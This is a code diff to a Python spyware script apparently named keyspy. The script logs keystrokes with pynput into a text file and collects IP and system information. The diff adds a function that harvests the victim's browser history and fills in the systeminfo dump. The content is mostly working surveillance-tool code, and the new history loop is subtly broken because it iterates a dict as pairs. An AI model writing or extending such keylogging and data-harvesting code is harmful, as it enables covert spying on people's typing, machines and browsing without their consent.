@@ -6,6 +6,7 @@ import sys
 from pynput import keyboard
 import requests
 import re
+import browserhistory as bh
 
 def keyboard_input(key_value):
     file = open('keyspy.txt','a')
@@ -55,16 +56,34 @@ def linux_system():
 def windows_system():
 
     os.system('ipconfig > ipinfo.txt')
-    os.system('systeminfo > ')
+    os.system('systeminfo > systeminfo.txt')
+
+def browserhistory():
+
+    try:
+        history = bh.get_browserhistory()
+        if history == {}:
+            print("No History or Maybe History is hidden.")
+        else:
+            for k,v in history:
+                print(f'{k} - {v}')
+    except:
+        print("Unable to fetch the BrowserHistory Information.")
 
 def main():
 
     ip_addr = ip_information()
-    os_platform = sys.platform
-    if os_platform == "linux":
-        linux_system()
-    else:
-        windows_system()
+    try:
+        os_platform = sys.platform
+        if os_platform == "linux":
+            linux_system()
+        else:
+            windows_system()
+    except:
+        print("[*] Unable to get the System information.")
+
+    browserhistory()
+        
     
 
 main()
